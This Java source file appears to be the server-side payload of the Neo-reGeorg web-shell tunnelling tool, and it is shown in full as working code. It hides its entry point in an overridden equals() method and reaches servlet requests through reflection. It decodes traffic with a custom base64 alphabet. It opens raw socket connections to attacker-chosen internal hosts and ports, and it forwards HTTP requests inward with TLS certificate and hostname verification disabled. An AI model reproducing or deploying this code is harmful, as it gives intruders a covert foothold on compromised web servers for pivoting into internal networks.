import javax.net.ssl.*;
import java.io.*;
import java.lang.reflect.Array;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.*;

/**
 https://github.com/BeichenDream/Godzilla/

 NeoreGeorg proudly uses BeichenDream Godzilla's KTLV-based serialization and deserialization engine
 */

public class NeoreGeorgPro  implements HostnameVerifier,X509TrustManager {

    private  char[] en = null;//char[] CHARSLIST
    public  String b64en(byte[] data) {
        StringBuffer sb = new StringBuffer();
        int len = data.length;
        int i = 0;
        int b1, b2, b3;
        while (i < len) {
            b1 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 0x3) << 4]);
                sb.append("==");
                break;
            }
            b2 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[((b1 & 0x03) << 4)
                        | ((b2 & 0xf0) >>> 4)]);
                sb.append(en[(b2 & 0x0f) << 2]);
                sb.append("=");
                break;
            }
            b3 = data[i++] & 0xff;
            sb.append(en[b1 >>> 2]);
            sb.append(en[((b1 & 0x03) << 4)
                    | ((b2 & 0xf0) >>> 4)]);
            sb.append(en[((b2 & 0x0f) << 2)
                    | ((b3 & 0xc0) >>> 6)]);
            sb.append(en[b3 & 0x3f]);
        }
        return sb.toString();
    }
    private  byte[] de = null; //byte[] ARRAYLIST
    public  byte[] b64de(String str) {
        byte[] data = str.getBytes();
        int len = data.length;
        ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
        int i = 0;
        int b1, b2, b3, b4;
        while (i < len) {
            do {
                b1 = de[data[i++]];
            } while (i < len && b1 == -1);
            if (b1 == -1) {
                break;
            }
            do {
                b2 = de[data[i++]];
            } while (i < len && b2 == -1);
            if (b2 == -1) {
                break;
            }
            buf.write((int) ((b1 << 2) | ((b2 & 0x30) >>> 4)));
            do {
                b3 = data[i++];
                if (b3 == 61) {
                    return buf.toByteArray();
                }
                b3 = de[b3];
            } while (i < len && b3 == -1);
            if (b3 == -1) {
                break;
            }
            buf.write((int) (((b2 & 0x0f) << 4) | ((b3 & 0x3c) >>> 2)));
            do {
                b4 = data[i++];
                if (b4 == 61) {
                    return buf.toByteArray();
                }
                b4 = de[b4];
            } while (i < len && b4 == -1);
            if (b4 == -1) {
                break;
            }
            buf.write((int) (((b3 & 0x03) << 6) | b4));
        }
        return buf.toByteArray();
    }

    static String headerkey(String str) throws Exception {
        String out = "";
        String[] sp = str.split("-");
        for (int i = 0; i < sp.length; i++) {
            String block = sp[i];
            out += block.substring(0, 1).toUpperCase() + block.substring(1);
            out += "-";
        }
        return out.substring(0, out.length() - 1);
    }
    boolean islocal(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        Enumeration nifs = NetworkInterface.getNetworkInterfaces();
        while (nifs.hasMoreElements()) {
            NetworkInterface nif = (NetworkInterface) nifs.nextElement();
            Enumeration addresses = nif.getInetAddresses();
            while (addresses.hasMoreElements()) {
                InetAddress addr = (InetAddress) addresses.nextElement();
                if (addr instanceof Inet4Address)
                    if (addr.getHostAddress().equals(ip))
                        return true;
            }
        }
        return false;
    }
    public static int bytesToInt(byte[] bytes) {
        int i;
        i = (bytes[0] & 0xff) | ((bytes[1] & 0xff) << 8)
                | ((bytes[2] & 0xff) << 16) | ((bytes[3] & 0xff) << 24);
        return i;
    }
    public static byte[] intToBytes(int value) {
        byte[] src = new byte[4];
        src[0] = (byte) (value & 0xFF);
        src[1] = (byte) ((value >> 8) & 0xFF);
        src[2] = (byte) ((value >> 16) & 0xFF);
        src[3] = (byte) ((value >> 24) & 0xFF);
        return src;
    }
    Object invokeMethod(Object obj,String methodName,Object[] parameters){
        Object ret = null;
        try {
            Class[] parametersClasses = new Class[0];
            if (parameters!=null){
                parametersClasses = new Class[parameters.length];
                for (int i = 0; i < parameters.length; i++) {
                    parametersClasses[i] = parameters[i].getClass();
                    if (Integer.class == parametersClasses[i]){
                        parametersClasses[i] = int.class;
                    }
                }
            }


            ret = obj.getClass().getMethod(methodName,parametersClasses).invoke(obj,parameters);
        }catch (Throwable e){
            e.printStackTrace();
        }
        return ret;
    }
    String getMethod(Object request){
        return (String) invokeMethod(request,"getMethod",null);
    }
    int getContentLength(Object request){
        return ((Integer) invokeMethod(request,"getContentLength",null)).intValue();
    }
    String getHeader(Object request,String headerKey){
        return (String) invokeMethod(request,"getHeader",new Object[]{headerKey});
    }
    Enumeration getHeaderNames(Object request){
        return (Enumeration) invokeMethod(request,"getHeaderNames",null);
    }
    InputStream getInputStream(Object request){
        return (InputStream) invokeMethod(request,"getInputStream",null);
    }
    void setHeader(Object response,String headerKey, String headerValue){
        invokeMethod(response,"setHeader",new Object[]{headerKey,headerValue});
    }
    void setStatus(Object response,int code){
        invokeMethod(response,"setStatus",new Object[]{new Integer(code)});
    }
    void resetBuffer(Object response){
        invokeMethod(response,"resetBuffer",null);
    }
    void reset(Object response){
        invokeMethod(response,"reset",null);
    }
    PrintWriter getWriter(Object response) {
        return (PrintWriter) invokeMethod(response,"getWriter",null);
    }
    void setAttribute(Object application,String attributeName,Object attributeValue) throws Exception {
        application.getClass().getMethod("setAttribute",new Class[]{String.class,Object.class}).invoke(application,new Object[]{attributeName,attributeValue});
    }
    Object getAttribute(Object application,String attributeName){
        return invokeMethod(application,"getAttribute",new Object[]{attributeName});
    }
    Object removeAttribute(Object application,String attributeName){
        return invokeMethod(application,"removeAttribute",new Object[]{attributeName});
    }

    public HashMap deserialize(byte[] bArr) {
        HashMap result = new HashMap();
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bArr);
        ByteArrayOutputStream keyBuf = new ByteArrayOutputStream();
        byte b = 0;
        byte[] length = new byte[4];
        while ((b = (byte) byteArrayInputStream.read()) > 0){
            if (b > (byte) 0x20 &&b <= (byte) 0x7e){
                keyBuf.write(b);
            }else {
                Object value = null;
                byteArrayInputStream.read(length,0,length.length);
                int valueLength = bytesToInt(length);
                byte[] data = new byte[valueLength];
                byteArrayInputStream.read(data,0,data.length);
                if (b == (byte) 0x01){
                    value = new String(data);
                }else if(b == (byte) 0x02){
                    value = data;
                }else if (b == (byte) 0x03){
                    value = new Integer(bytesToInt(data));
                }else {
                    throw new UnsupportedOperationException();
                }
                result.put(new String(keyBuf.toByteArray()),value);
                keyBuf.reset();
            }
        }
        return result;
    }
    public byte[] serialize(HashMap parameters) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte type = 0;
        Iterator keys = parameters.keySet().iterator();
        while (keys.hasNext()){
            String key = keys.next().toString();
            Object value = parameters.get(key);
            byte[] valueBytes = null;
            if (String.class.isInstance(value)){
                type = (byte) 0x01;
                valueBytes = ((String)value).getBytes();
            }else if (byte[].class.isInstance(value)){
                type = (byte) 0x02;
                valueBytes = ((byte[])value);
            }else if (int.class.isInstance(value) || Integer.class.isInstance(value)){
                type = (byte) 0x03;
                valueBytes = intToBytes(((Integer) value).intValue());
            }else {
                throw new UnsupportedOperationException();
            }
            buf.write(key.getBytes());
            buf.write(type);
            buf.write(intToBytes(valueBytes.length));
            buf.write(valueBytes);

        }


        return buf.toByteArray();
    }


    public boolean equals(Object o) {
        // 0 Object request
        // 1 Object response
        // 2 Object application
        // 3 char[] CHARSLIST
        // 4 byte[] ARRAYLIST
        // 5 int MAXREADSIZE
        // 6 int READBUF
        // 7 int HTTPCODE
        // 8 int hello msg
        if (o!=null && Object[].class.isInstance(o) && Array.getLength(o) >= 9){
            Object[] oArray = (Object[]) o;
            try {
                Object request = oArray[0];
                Object response = oArray[1];
                Object application = oArray[2];
                this.en = (char[]) oArray[3];
                this.de = (byte[]) oArray[4];
                int MAXREADSIZE = ((Integer) oArray[5]).intValue();
                int READBUF = ((Integer) oArray[6]).intValue();
                int HTTPCODE = ((Integer) oArray[7]).intValue();
                String helloMsg = (String) oArray[8];

                PrintWriter out = getWriter(response);

                String requestData = null;
                InputStream requestInputStream = getInputStream(request);
                if (requestInputStream != null && (requestInputStream.available()>0 || "POST".equals(getMethod(request)) || getContentLength(request) > 0)){
                    LineNumberReader lineNumberReader = new LineNumberReader(new InputStreamReader(requestInputStream));
                    requestData = lineNumberReader.readLine();
                    lineNumberReader.close();
                }


                HashMap requestPar = null;
                if (requestData != null && requestData.length() > 0){
                    requestPar = deserialize(b64de(requestData));
                }else {
                    requestPar = new HashMap();
                }


                String rUrl = (String) requestPar.get("X-REDIRECTURL");
                if (rUrl != null) {
                    requestPar.remove("X-REDIRECTURL");
                    rUrl = new String(rUrl);
                    if (!islocal(rUrl)){
                        reset(response);
                        String method = getMethod(request);
                        URL u = new URL(rUrl);
                        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                        if (HttpsURLConnection.class.isInstance(conn)){
                            ((HttpsURLConnection)conn).setHostnameVerifier(this);
                            SSLContext ctx = SSLContext.getInstance("SSL");
                            ctx.init(null, new TrustManager[] { this }, null);
                            ((HttpsURLConnection)conn).setSSLSocketFactory(ctx.getSocketFactory());
                        }

                        conn.setRequestMethod(method);
                        conn.setDoOutput(true);

                        // conn.setConnectTimeout(200);
                        // conn.setReadTimeout(200);

                        Enumeration enu = getHeaderNames(request);
                        List keys = Collections.list(enu);
                        Collections.reverse(keys);
                        for (int i = 0; i < keys.size(); i++) {
                            String key = (String) keys.get(i);
                            String value=getHeader(request,key);
                            conn.setRequestProperty(headerkey(key), value);
                        }

                        int i;
                        byte[] buffer = new byte[1024];
                        if (!requestPar.isEmpty()){
                            OutputStream output;
                            try{
                                output = conn.getOutputStream();
                            }catch(Exception e){
                                HashMap result = new HashMap();
                                result.put("X-ERROR","Intranet forwarding failed");
                                out.write(b64en(serialize(result)));
                                return false;
                            }

                            output.write(b64en(serialize(requestPar)).getBytes());
                            output.flush();
                            output.close();
                        }

                        Iterator reqKeys = conn.getHeaderFields().keySet().iterator();
                        while (reqKeys.hasNext()){
                            String key = (String) reqKeys.next();
                            if (key != null && !key.equalsIgnoreCase("Content-Length") && !key.equalsIgnoreCase("Transfer-Encoding")  && !key.equalsIgnoreCase("Content-Encoding")){
                                String value = conn.getHeaderField(key);
                                setHeader(response,key, value);
                            }
                        }


                        InputStream hin;
                        if (conn.getResponseCode() < HttpURLConnection.HTTP_BAD_REQUEST) {
                            hin = conn.getInputStream();
                        } else {
                            hin = conn.getErrorStream();
                            if (hin == null){
                                setStatus(response,HTTPCODE);
                                return false;
                            }
                        }

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        while ((i = hin.read(buffer)) != -1) {
                            byte[] data = new byte[i];
                            System.arraycopy(buffer, 0, data, 0, i);
                            baos.write(data);
                        }
                        String responseBody = new String(baos.toByteArray());
                        setHeader(response,"Content-Length", Integer.toString(responseBody.length()));
                        setStatus(response,conn.getResponseCode());
                        out.write(responseBody);
                        out.flush();

                        if ( true ) return false; // exit
                    }
                }

                resetBuffer(response);
                setStatus(response,HTTPCODE);
                String cmd = (String) requestPar.get("X-CMD");
                if (cmd != null) {
                    String mark = cmd.substring(0,22);
                    cmd = cmd.substring(22);
                    if (cmd.compareTo("CONNECT") == 0) {
                        try {
                            String target = (String) requestPar.get("X-HOST");
                            int port = ((Integer) requestPar.get("X-PORT")).intValue();
                            SocketChannel socketChannel = SocketChannel.open();
                            socketChannel.connect(new InetSocketAddress(target, port));
                            socketChannel.configureBlocking(false);
                            setAttribute(application,mark, socketChannel);
                            HashMap result = new HashMap();
                            result.put("X-STATUS","OK");
                            out.write(b64en(serialize(result)));
                        } catch (Exception e) {
                            HashMap result = new HashMap();
                            result.put("X-ERROR","Failed connecting to target");
                            result.put("X-STATUS","FAIL");
                            out.write(b64en(serialize(result)));
                        }
                    } else if (cmd.compareTo("DISCONNECT") == 0) {
                        SocketChannel socketChannel = (SocketChannel)getAttribute(application,mark);
                        try{
                            socketChannel.socket().close();
                        } catch (Exception e) {
                        }
                        removeAttribute(application,mark);
                        HashMap result = new HashMap();
                        result.put("X-STATUS","OK");
                        out.write(b64en(serialize(result)));
                    } else if (cmd.compareTo("READ") == 0){
                        SocketChannel socketChannel = (SocketChannel)getAttribute(application,mark);
                        try{
                            ByteBuffer buf = ByteBuffer.allocate(READBUF);
                            int bytesRead = socketChannel.read(buf);
                            int maxRead = MAXREADSIZE;
                            int readLen = 0;
                            byte[] data = new byte[bytesRead];
                            ByteArrayOutputStream membuf = new ByteArrayOutputStream();
                            while (bytesRead > 0){
                                System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                                membuf.write(data,0,bytesRead);
                                ((java.nio.Buffer)buf).clear();
                                readLen += bytesRead;
                                if (bytesRead < READBUF || readLen >= maxRead)
                                    break;
                                bytesRead = socketChannel.read(buf);
                            }
                            HashMap result = new HashMap();
                            result.put("X-STATUS","OK");
                            result.put("X-DATA",membuf.toByteArray());
                            out.write(b64en(serialize(result)));

                        } catch (Exception e) {
                            HashMap result = new HashMap();
                            result.put("X-STATUS","FAIL");
                            out.write(b64en(serialize(result)));
                        }

                    } else if (cmd.compareTo("FORWARD") == 0){
                        SocketChannel socketChannel = (SocketChannel)getAttribute(application,mark);
                        try {
                            byte[] data = (byte[]) requestPar.get("X-DATA");
                            ByteBuffer buf = ByteBuffer.allocate(data.length);
                            buf.put(data);
                            buf.flip();

                            while(buf.hasRemaining())
                                socketChannel.write(buf);

                            HashMap result = new HashMap();
                            result.put("X-STATUS","OK");
                            out.write(b64en(serialize(result)));

                        } catch (Exception e) {
                            HashMap result = new HashMap();
                            result.put("X-ERROR", "POST request read filed");
                            result.put("X-STATUS","FAIL");
                            out.write(b64en(serialize(result)));
                            socketChannel.socket().close();
                        }
                    }
                } else {
                    out.write(helloMsg);
                }

            }catch (Throwable e){

            }
        }
        return false;
    }


    public boolean verify(String s, SSLSession sslSession) {
        return true;
    }



    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {

    }


    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {

    }


    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
